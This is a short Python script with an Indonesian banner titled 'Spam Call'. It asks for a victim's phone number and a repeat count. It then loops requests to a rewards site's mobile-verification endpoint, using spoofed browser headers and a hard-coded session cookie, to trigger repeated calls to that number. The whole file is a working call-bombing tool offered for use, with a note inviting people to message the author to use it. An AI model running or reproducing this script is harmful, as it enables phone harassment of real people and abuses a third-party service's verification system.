import requests,json,os,time

os.system("clear")
banner = """
        Spam Call
     = ----------- =

[@] Creator : Rebo Kawaii :v

[@] Youtube : The Rebo [ https://m.youtube.com/channel/UCdn7HkUdL8YyYLHSaa8tK-Q ]

Please Subscribe :v

|------------------------------------------|

[?] Bagaimana Anda Bisa Sampai Kesini?

[😂] Jangan Marah Ya Bang 🚁

[#] Kalo Mau Pakai Ini Script Chat Aja :v

|------------------------------------------|

[!] Contoh : 8123456789 [ Awalannya '8' ]
"""
print(banner)
nomor = input("[+] Nomor : ")
jumlah = int(input("[+] Jumlah : "))

ua = {"Host":"id.jagreward.com",
"Connection":"keep-alive",
"Save-Data":"on",
"Upgrade-Insecure-Requests":"1",
"User-Agent":"Mozilla/5.0 (Linux; Android 11; M2101K7AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Accept-Encoding":"gzip, deflate",
"Accept-Language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
'Cookie':'PHPSESSID=d0u6cbsaqja0vm9h2br1jia4vi; DAPROPS="sjs.webGlRenderer:Adreno (TM) 612|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:2.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:0|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0"; _ga=GA1.3.1708952033.1639802261; _gid=GA1.3.134255966.1639802261; _gat=1'}
url = f"http://id.jagreward.com/member/verify-mobile/{nomor}/"
for i in range(int(jumlah)):
  req = requests.get(url,headers=ua).text
  Rebo = json.loads(req)
  xn = Rebo["result"]
  xx = Rebo["message"]
  print(f"Result: {xn}, Message: {xx}")
  time.sleep(5)
